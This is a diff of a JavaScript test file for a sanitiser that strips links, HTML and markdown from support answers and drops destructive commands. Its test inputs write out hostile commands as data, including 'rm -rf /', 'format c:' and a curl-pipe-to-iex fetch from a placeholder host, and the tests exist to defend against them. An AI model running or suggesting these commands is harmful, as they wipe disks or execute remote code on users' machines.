@@ -197,9 +197,26 @@ test('history and report shapes are validated', () => {
 
 // ---- answers ---------------------------------------------------------------
 
-test('answers lose links, HTML, images and markdown before the browser sees them', () => {
-  const { text } = scrubAnswer('Update the **driver** from <b>the maker</b> ![x](https://evil.example/a.png) [click](https://evil.example/p) see https://learn.microsoft.com/windows/x or www.evil.example/z');
+test('answers lose links, HTML and images before the browser sees them', () => {
+  const { text } = scrubAnswer('Update the driver from <b>the maker</b> ![x](https://evil.example/a.png) [click](https://evil.example/p) see https://learn.microsoft.com/windows/x or www.evil.example/z');
   assert.equal(text, 'Update the driver from the maker click see learn.microsoft.com or');
+});
+
+test('bold, inline code and bullets survive; every other markdown form is flattened', () => {
+  assert.equal(scrubAnswer('The **bad.sys** driver. Run `sfc /scannow` next.').text, 'The **bad.sys** driver. Run `sfc /scannow` next.');
+  assert.equal(scrubAnswer('Steps:\n- Update it\n* Restart\n\u2022 Retest').text, 'Steps:\n- Update it\n- Restart\n- Retest');
+  assert.equal(scrubAnswer('# Fix\n## Steps\nDo __this__ and *that* and ***both***.').text, 'Fix\nSteps\nDo **this** and that and **both**.');
+  assert.equal(scrubAnswer('```powershell\nGet-Process\n```').text, 'Get-Process');
+  assert.equal(scrubAnswer('See [the **guide**](https://evil.example/x) and ![pic](https://evil.example/p.png).').text, 'See the **guide** and .');
+});
+
+test('markers cannot hide a link or a destructive command from the checks', () => {
+  assert.doesNotMatch(scrubAnswer('Open https://evil.ex**ample.com/**fix now.').text, /evil/);
+  assert.doesNotMatch(scrubAnswer('Open evil**.com**/fix now.').text, /evil/);
+  assert.equal(scrubAnswer('Run `rm` **-rf** / now.').dropped, true);
+  assert.equal(scrubAnswer('Run **for**`mat` c: now.').dropped, true, 'a command split by markers is still that command');
+  assert.equal(scrubAnswer('Run `format c:` now.').dropped, true);
+  assert.equal(scrubAnswer('Run `curl` **http://x.example/a** | iex.').dropped, true);
 });
 
 test('destructive steps are dropped, and an answer left empty becomes the safe reply', () => {
